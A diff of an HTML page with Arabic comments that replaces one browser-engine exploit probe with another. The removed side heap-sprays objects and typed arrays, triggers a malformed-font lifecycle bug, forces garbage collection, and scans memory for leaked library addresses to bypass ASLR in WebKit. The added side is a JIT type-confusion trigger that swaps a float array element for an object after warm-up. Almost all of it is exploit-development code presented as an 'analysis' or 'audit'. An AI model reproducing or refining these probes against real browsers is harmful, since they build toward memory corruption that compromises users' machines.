@@ -1,117 +1,47 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>WebKit Advanced Layout Analysis</title>
-    <style>
-        body { font-family: monospace; background: #0a0a0a; color: #00ff66; padding: 20px; line-height: 1.5; }
-        #status { font-weight: bold; color: #fff; text-shadow: 0 0 5px #00ff66; }
-        #log { margin-top: 20px; color: #00ddff; }
-    </style>
+    <title>JIT Optimization & Type Tracking Analysis</title>
 </head>
 <body>
-    <h1>WebKit Advanced Subspace Probing</h1>
-    <p>المؤشر الحالي: <span id="status">انتظار الأمر...</span></p>
-    <div id="log"></div>
+    <h1>JIT Optimization Inspector</h1>
+    <p>الحالة: <span id="jit-status">جاري الفحص...</span></p>
 
     <script>
-        var propertySpray = [];
-        var totalAllocations = 600;
-
-        function printLog(msg) {
-            var logDiv = document.getElementById('log');
-            logDiv.innerHTML += "[*] " + msg + "<br>";
+        // 1. دالة يتم استدعاؤها بكثافة ليقوم محرك الـ JIT بتحسين أصلها
+        function optimizeTarget(arr) {
+            // دالة افتراضية تعتمد على أن المدخلات هي أرقام فقط (فضاء محتسب)
+            return arr[0] + 2.5;
         }
 
-        function updateStatus(statusText) {
-            document.getElementById('status').innerText = statusText;
-        }
+        function runJitAudit() {
+            // إنشاء مصفوفة تحتوي على أعداد عائمة (Float64)
+            let floatArray = [1.1, 2.2, 3.3];
 
-        function startAdvancedGrooming() {
-            updateStatus("جاري تهيئة الحشو البنيوي المتقدم...");
-            printLog("استهداف الفتحات الذاكرية المشتركة عبر كائنات مخصصة...");
+            // تحفيز محرك الـ JIT عبر تكرار الاستدعاء (Warm-up Phase)
+            // هذا يجعل المترجم يثبت نوع البيانات داخل الـ Cache
+            for (let i = 0; i < 10000; i++) {
+                optimizeTarget(floatArray);
+            }
+
+            // 2. مرحلة اختبار كسر النوع (Type Transition Test)
+            // نقوم فجأة بتحويل أحد عناصر المصفوفة إلى "كائن" بدلاً من رقم
+            floatArray[0] = { customProperty: 0x41414141 };
 
             try {
-                // بدلاً من ArrayBuffer العادية، نقوم بإنشاء كائنات ذات خصائص متدرجة
-                // تحاكي الهيكل الداخلي لـ vptr والتأطير الديناميكي (16/32 بايت)
-                for (var i = 0; i < totalAllocations; i++) {
-                    var obj = {};
-                    // بناء تدرج داخلي في الذاكرة لتأمين مطابقة العناوين
-                    obj.inlinePropertyA = 0x41414141;
-                    obj.inlinePropertyB = (i % 2 === 0) ? 0x10101010 : 0x20202020;
-                    
-                    // إنشاء مصفوفة تعبئة مرنة لمحاكاة أحجام كتل كائنات الخطوط
-                    var dynamicPadding = new Float64Array(128 + (i % 4) * 4);
-                    dynamicPadding[0] = 1.1; // تلوث مبدئي للـ Float Heap
-                    
-                    obj.payload = dynamicPadding;
-                    propertySpray.push(obj);
-                }
+                // استدعاء الدالة بعد تغيير النوع
+                // الأنظمة الحديثة يجب أن تكتشف التغيير فوراً وتلغي التحسين آلياً
+                let result = optimizeTarget(floatArray);
                 
-                printLog("تم نشر الكائنات الهيكلية في فضاء الـ Heap.");
-                executeAdvancedLifecycleTest();
-            } catch (e) {
-                updateStatus("فشل التخصيص الهيكلي");
-                printLog("خطأ: " + e.message);
+                document.getElementById('jit-status').innerText = 
+                    "اكتمل الفحص: المحرك تعامل مع كسر الأنواع بشكل آمن.";
+            } catch (err) {
+                document.getElementById('jit-status').innerText = 
+                    "تم رصد استثناء منطقي: " + err.message;
             }
         }
 
-        function executeAdvancedLifecycleTest() {
-            updateStatus("بدء اختبار دورة حياة كائن الخط المعزول...");
-            
-            try {
-                // ترويسة خط معدلة لتحفيز التحرير والاحتفاظ المؤقت بالمرجع
-                var font = new FontFace('TestFont', 'url(data:font/opentype;base64,T1RUTwAAAA==)');
-                
-                font.load().then(function() {
-                    updateStatus("اكتمل التحميل (غير متوقع)");
-                }).catch(function(err) {
-                    updateStatus("الحالة العكسية نشطة");
-                    printLog("تم التقاط إشارة الفشل. جاري محاولة التقاط العنوان الملوث...");
-                    
-                    // تحفيز محرك جمع القمامة بالتزامن مع فحص محتويات الكائنات المحشوة
-                    if (typeof gc === 'function') gc(); 
-                    
-                    runDeepScan();
-                });
-            } catch (e) {
-                updateStatus("فشل استدعاء الواجهة");
-                printLog("خطأ: " + e.message);
-            }
-        }
-
-        function runDeepScan() {
-            updateStatus("جاري فحص الخصائص الملوثة...");
-            var leakDetected = false;
-
-            for (var i = 0; i < propertySpray.length; i++) {
-                var buffer = propertySpray[i].payload.buffer;
-                if (buffer.byteLength < 16) continue;
-                
-                var view = new DataView(buffer);
-                try {
-                    // مسح الكتل بحثاً عن قيم تشير إلى تداخل عناوين VTable
-                    var checkValue = view.getBigUint64(0, true);
-                    
-                    // التحقق من النطاقات الديناميكية للمكتبات المشتركة بالنظام
-                    if (checkValue > 0x100000000n && checkValue < 0x800000000n) {
-                        updateStatus("تم رصد تداخل العناوين بنجاح!");
-                        printLog("العنوان المسترجع في الكتلة [" + i + "]: 0x" + checkValue.toString(16));
-                        leakDetected = true;
-                        break;
-                    }
-                } catch (e) {}
-            }
-
-            if (!leakDetected) {
-                updateStatus("فحص سلبي - الذاكرة محمية تماماً ضد الهياكل الحالية");
-                printLog("النتيجة: مخصص bmalloc يحتفظ بالفصل. الخطوة التالية تتطلب تعديل استراتيجية الحشو البنيوي.");
-            }
-        }
-
-        window.onload = function() {
-            setTimeout(startAdvancedGrooming, 600);
-        };
+        window.onload = runJitAudit;
     </script>
 </body>
 </html>
